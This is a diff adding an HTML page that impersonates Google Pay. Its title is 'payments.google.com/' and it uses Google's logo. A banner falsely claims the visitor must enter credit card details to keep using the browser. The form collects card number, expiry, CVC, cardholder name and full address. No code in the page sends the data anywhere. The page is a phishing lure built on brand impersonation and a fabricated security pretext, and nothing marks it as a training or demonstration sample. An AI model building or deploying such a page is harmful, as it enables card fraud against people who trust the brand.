@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>payments.google.com/</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Prevent body scroll */
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0px 2px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 420px;
+            max-height: 80vh; /* Set a maximum height */
+            padding: 20px;
+            overflow-y: auto; /* Enable vertical scroll if content exceeds */
+        }
+
+        .container h1 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: normal;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .input-container input[type="text"], 
+        .input-container input[type="number"],
+        .input-container input[type="password"] {
+            width: 100%;
+            height: 48px;
+            padding: 12px;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            outline: none;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-bottom 0.3s ease-in-out;
+        }
+
+        .input-container input:focus {
+            border-bottom: 2px solid #1a73e8;
+        }
+
+        .input-container label {
+            position: absolute;
+            top: 16px;
+            left: 12px;
+            font-size: 16px;
+            color: #999;
+            pointer-events: none;
+            transition: 0.3s ease all;
+            
+        }
+
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            height: 48px;
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #1669c2;
+        }
+
+        .gpay-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .gpay-logo img {
+            width: 120px;
+        }
+
+        .two-col {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+        }
+
+        .two-col div {
+            flex: 1;
+            margin-right: 10px;
+        }
+
+        .two-col div:last-child {
+            margin-right: 0;
+        }
+
+        .dropdown {
+            position: relative;
+            margin: 8px 0;
+        }
+
+        .dropbtn {
+            width: 100%;
+            height: 48px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            padding: 12px;
+            font-size: 16px;
+            text-align: left;
+            cursor: pointer;
+            outline: none;
+            transition: border-bottom 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+        }
+
+        .dropbtn img {
+            margin-right: 10px;
+            width: 20px;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #f9f9f9;
+            width: 100%;
+            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
+            z-index: 1;
+        }
+
+        .dropdown-content .country-option {
+            padding: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .dropdown-content .country-option:hover {
+            background-color: #f1f1f1;
+        }
+
+        .country-option img {
+            width: 20px;
+            margin-right: 8px;
+        }
+
+        .credit-card-verification {
+            background-color: #dde8f7; /* Light blue background */
+            border-left: 5px solid #0259b5; /* Dark blue left line */
+            padding: 15px; /* Padding for the box */
+            border-radius: 5px; /* Slightly rounded corners */
+            color: #646262; /* White text color */
+            max-width: 600px; /* Maximum width of the box */
+            margin: 20px auto; /* Center the box */
+        }
+
+        .credit-card-verification h3 {
+            margin: 0; /* Remove default margin */
+            font-size: 14px; /* Adjust font size as needed */
+            font-weight: normal; /* Set font weight to normal */
+        }
+        .expiry-separator {
+            margin: 25px 10px; /* Add some margin for spacing */
+            font-size: 16px; /* Adjust font size if needed */
+            color: #999; /* Change color to match your design */
+            vertical-align: middle; /* Align the separator vertically */
+        }
+
+        .cvc-container {
+            display: flex; /* Use flexbox for layout */
+            align-items: center; /* Center items vertically */
+        }
+
+        .cvc-image {
+            width: 20px; /* Adjust the width of the image as needed */
+            height: auto; /* Maintain aspect ratio */
+            margin-left: 100px; /* Spacing between input and image */
+            position: relative; /* Allow positioning adjustments */
+            top: -30px; /* Move the image slightly up */
+        }
+
+        .caret {
+            display: inline-block;
+            width: 0;
+            height: 0;
+            margin-left: 230px; /* Space between text and triangle */
+            border-left: 5px solid transparent; /* Left side of the triangle */
+            border-right: 5px solid transparent; /* Right side of the triangle */
+            border-top: 5px solid #626161; /* Color of the triangle */
+            vertical-align: middle; /* Align the triangle vertically with the text */
+        }
+
+
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="gpay-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Google_Pay_Logo.svg/1920px-Google_Pay_Logo.svg.png" alt="Google Pay">
+        </div>
+        <h1>Add a payment method</h1>
+        <div class="credit-card-verification">
+            <h3>Please enter your credit card details to verify your identity for continued use of the browser. This information is necessary to ensure secure and uninterrupted access to our services.</h3>
+        </div>
+        
+        <form id="paymentForm">
+            <!-- Card number -->
+            <div class="input-container">
+                <input type="text" id="card-number" name="card-number" placeholder=" " maxlength="16" required>
+                <label for="card-number">Card number</label>
+            </div>
+
+            <!-- Expiry date and CVC -->
+            <div class="two-col">
+                <div class="input-container">
+                    <input type="text" id="expiry-month" name="expiry-month" placeholder="" maxlength="2" required pattern="(0[1-9]|1[0-2])">
+                    <label for="expiry-month">MM</label>
+                </div>
+                <span class="expiry-separator">/</span> <!-- Separator for MM / YY -->
+                <div class="input-container">
+                    <input type="text" id="expiry-year" name="expiry-year" placeholder="" maxlength="2" required pattern="[0-9]{2}">
+                    <label for="expiry-year">YY</label>
+                </div>
+                <div class="input-container">
+                    <input type="text" id="cvc" name="cvc" placeholder="" maxlength="3" required>
+                    <label for="cvc">CVC</label>
+                    <img src="https://lh6.ggpht.com/APpP9xUqifAYI7qNPeTdxQ4qLbFEXZVYupHeLr93Jf-8UuZTnEfEd2wYi2kEvHT8sVbBgMhOMA" alt="CVC" class="cvc-image">
+                </div>
+            </div>
+
+            <!-- Cardholder Name -->
+            <div class="input-container">
+                <input type="text" id="cardholder-name" name="cardholder-name" placeholder=" " required>
+                <label for="cardholder-name">Cardholder name</label>
+            </div>
+
+            <!-- Adress line 1 -->
+            <div class="input-container">
+                <input type="text" id="Adress line 1" name="Adress line 1" placeholder=" " required>
+                <label for="Adress line 1">Adress line 1</label>
+            </div>
+
+            <!-- Adress line 2 -->
+            <div class="input-container">
+                <input type="text" id="Adress line 2" name="Adress line 2" placeholder=" " required>
+                <label for="Adress line 2">Adress line 2</label>
+            </div>
+
+            <!-- City -->
+            <div class="input-container">
+                <input type="text" id="City" name="City" placeholder=" " required>
+                <label for="City">City</label>
+            </div>
+
+            <!-- Postal code -->
+            <div class="input-container">
+                <input type="text" id="Postal code" name="Postal code" placeholder=" " required>
+                <label for="City">Postal code</label>
+            </div>
+
+
+<!-- Country -->
+<label for="country">Country</label>
+<div class="dropdown">
+    <button class="dropbtn" type="button">
+        Select your country 
+        <span class="caret"></span> <!-- Triangular sign -->
+    </button>
+    <div class="dropdown-content" id="countryDropdown">
+        <!-- Country options will be dynamically added here -->
+    </div>
+</div>
+
+<script>
+// Country data
+const countries = {
+    AF: "Afghanistan", 
+    AL: "Albania",
+    DZ: "Algeria",
+    AS: "American Samoa",
+    AD: "Andorra",
+    AO: "Angola",
+    AI: "Anguilla",
+    AG: "Antigua and Barbuda",
+    AR: "Argentina",
+    AM: "Armenia",
+    AW: "Aruba",
+    AU: "Australia",
+    AT: "Austria",
+    AZ: "Azerbaijan",
+    BS: "Bahamas",
+    BH: "Bahrain",
+    BD: "Bangladesh",
+    BB: "Barbados",
+    BY: "Belarus",
+    BE: "Belgium",
+    BZ: "Belize",
+    BJ: "Benin",
+    BM: "Bermuda",
+    BT: "Bhutan",
+    BO: "Bolivia, Plurinational State of",
+    BA: "Bosnia and Herzegovina",
+    BW: "Botswana",
+    BR: "Brazil",
+    IO: "British Indian Ocean Territory",
+    BG: "Bulgaria",
+    BF: "Burkina Faso",
+    BI: "Burundi",
+    KH: "Cambodia",
+    CM: "Cameroon",
+    CA: "Canada",
+    CV: "Cape Verde",
+    KY: "Cayman Islands",
+    CF: "Central African Republic",
+    TD: "Chad",
+    CL: "Chile",
+    CN: "China",
+    CO: "Colombia",
+    KM: "Comoros",
+    CG: "Congo",
+    CD: "Democratic Republic of the Congo",
+    CK: "Cook Islands",
+    CR: "Costa Rica",
+    CI: "Côte d'Ivoire",
+    HR: "Croatia",
+    CU: "Cuba",
+    CW: "Curaçao",
+    CY: "Cyprus",
+    CZ: "Czech Republic",
+    DK: "Denmark",
+    DJ: "Djibouti",
+    DM: "Dominica",
+    DO: "Dominican Republic",
+    EC: "Ecuador",
+    EG: "Egypt",
+    SV: "El Salvador",
+    GQ: "Equatorial Guinea",
+    ER: "Eritrea",
+    EE: "Estonia",
+    ET: "Ethiopia",
+    FK: "Falkland Islands (Malvinas)",
+    FO: "Faroe Islands",
+    FJ: "Fiji",
+    FI: "Finland",
+    FR: "France",
+    PF: "French Polynesia",
+    GA: "Gabon",
+    GM: "Gambia",
+    GE: "Georgia",
+    DE: "Germany",
+    GH: "Ghana",
+    GI: "Gibraltar",
+    GR: "Greece",
+    GL: "Greenland",
+    GD: "Grenada",
+    GU: "Guam",
+    GT: "Guatemala",
+    GG: "Guernsey",
+    GN: "Guinea",
+    GW: "Guinea-Bissau",
+    HT: "Haiti",
+    HN: "Honduras",
+    HK: "Hong Kong",
+    HU: "Hungary",
+    IS: "Iceland",
+    IN: "India",
+    ID: "Indonesia",
+    IR: "Iran, Islamic Republic of",
+    IQ: "Iraq",
+    IE: "Ireland",
+    IM: "Isle of Man",
+    IL: "Israel",
+    IT: "Italy",
+    JM: "Jamaica",
+    JP: "Japan",
+    JE: "Jersey",
+    JO: "Jordan",
+    KZ: "Kazakhstan",
+    KE: "Kenya",
+    KI: "Kiribati",
+    KP: "North Korea",
+    KR: "South Korea",
+    KW: "Kuwait",
+    KG: "Kyrgyzstan",
+    LA: "Lao People's Democratic Republic",
+    LV: "Latvia",
+    LB: "Lebanon",
+    LS: "Lesotho",
+    LR: "Liberia",
+    LY: "Libya",
+    LI: "Liechtenstein",
+    LT: "Lithuania",
+    LU: "Luxembourg",
+    MO: "Macao",
+    MK: "Republic of Macedonia",
+    MG: "Madagascar",
+    MW: "Malawi",
+    MY: "Malaysia",
+    MV: "Maldives",
+    ML: "Mali",
+    MT: "Malta",
+    MH: "Marshall Islands",
+    MQ: "Martinique",
+    MR: "Mauritania",
+    MU: "Mauritius",
+    MX: "Mexico",
+    FM: "Micronesia, Federated States of",
+    MD: "Republic of Moldova",
+    MC: "Monaco",
+    MN: "Mongolia",
+    ME: "Montenegro",
+    MS: "Montserrat",
+    MA: "Morocco",
+    MZ: "Mozambique",
+    MM: "Myanmar",
+    NA: "Namibia",
+    NR: "Nauru",
+    NP: "Nepal",
+    NL: "Netherlands",
+    NZ: "New Zealand",
+    NI: "Nicaragua",
+    NE: "Niger",
+    NG: "Nigeria",
+    NU: "Niue",
+    NF: "Norfolk Island",
+    MP: "Northern Mariana Islands",
+    NO: "Norway",
+    OM: "Oman",
+    PK: "Pakistan",
+    PW: "Palau",
+    PS: "Palestinian Territory",
+    PA: "Panama",
+    PG: "Papua New Guinea",
+    PY: "Paraguay",
+    PE: "Peru",
+    PH: "Philippines",
+    PN: "Pitcairn",
+    PL: "Poland",
+    PT: "Portugal",
+    PR: "Puerto Rico",
+    QA: "Qatar",
+    RO: "Romania",
+    RU: "Russia",
+    RW: "Rwanda",
+    KN: "Saint Kitts and Nevis",
+    LC: "Saint Lucia",
+    WS: "Samoa",
+    SM: "San Marino",
+    ST: "Sao Tome and Principe",
+    SA: "Saudi Arabia",
+    SN: "Senegal",
+    RS: "Serbia",
+    SC: "Seychelles",
+    SL: "Sierra Leone",
+    SG: "Singapore",
+    SX: "Sint Maarten",
+    SK: "Slovakia",
+    SI: "Slovenia",
+    SB: "Solomon Islands",
+    SO: "Somalia",
+    ZA: "South Africa",
+    SS: "South Sudan",
+    ES: "Spain",
+    LK: "Sri Lanka",
+    SD: "Sudan",
+    SR: "Suriname",
+    SZ: "Swaziland",
+    SE: "Sweden",
+    CH: "Switzerland",
+    SY: "Syria",
+    TW: "Taiwan",
+    TJ: "Tajikistan",
+    TZ: "Tanzania",
+    TH: "Thailand",
+    TG: "Togo",
+    TK: "Tokelau",
+    TO: "Tonga",
+    TT: "Trinidad and Tobago",
+    TN: "Tunisia",
+    TR: "Turkey",
+    TM: "Turkmenistan",
+    TC: "Turks and Caicos Islands",
+    TV: "Tuvalu",
+    UG: "Uganda",
+    UA: "Ukraine",
+    AE: "United Arab Emirates",
+    GB: "United Kingdom",
+    US: "United States",
+    UY: "Uruguay",
+    UZ: "Uzbekistan",
+    VU: "Vanuatu",
+    VE: "Venezuela, Bolivarian Republic of",
+    VN: "Viet Nam",
+    VI: "Virgin Islands",
+    YE: "Yemen",
+    ZM: "Zambia",
+    ZW: "Zimbabwe"
+};
+
+// Function to populate dropdown
+function populateCountries() {
+    const dropdown = document.getElementById('countryDropdown');
+    for (const [code, name] of Object.entries(countries)) {
+        const option = document.createElement('div');
+        option.className = 'country-option';
+        option.setAttribute('data-value', code);
+        option.innerHTML = `<img src="https://raw.githubusercontent.com/ekwonye-richard/react-flags-select/7ab9fc9c5f0ca34546377dfa48aeec5edf28919a/flags/${code.toLowerCase()}.svg" alt="${code} Flag"> ${name} (${code})`;
+        dropdown.appendChild(option);
+    }
+}
+
+// Call the function to populate countries when the page loads
+document.addEventListener('DOMContentLoaded', populateCountries);
+</script>
+            <!-- Submit Button -->
+            <input type="submit" value="Add Card">
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const dropdownBtn = document.querySelector('.dropbtn');
+            const dropdownContent = document.querySelector('.dropdown-content');
+            const countryOptions = document.querySelectorAll('.country-option');
+            const flagImg = dropdownBtn.querySelector('img');
+
+            countryOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const selectedCountry = option.textContent.trim();
+                    const selectedFlag = option.querySelector('img').src;
+                    
+                    // Update the button with the selected country's flag and name
+                    dropdownBtn.innerHTML = `<img src="${selectedFlag}" alt="Flag"> ${selectedCountry}`;
+                    
+                    // Close the dropdown
+                    dropdownContent.style.display = 'none';
+                });
+            });
+
+            // Toggle dropdown visibility on button click
+            dropdownBtn.addEventListener('click', function() {
+                dropdownContent.style.display = dropdownContent.style.display === 'block' ? 'none' : 'block';
+            });
+
+            // Hide dropdown if clicked outside
+            document.addEventListener('click', function(event) {
+                if (!event.target.closest('.dropdown')) {
+                    dropdownContent.style.display = 'none';
+                }
+            });
+        });     
+    </script>
+</body>
+</html>
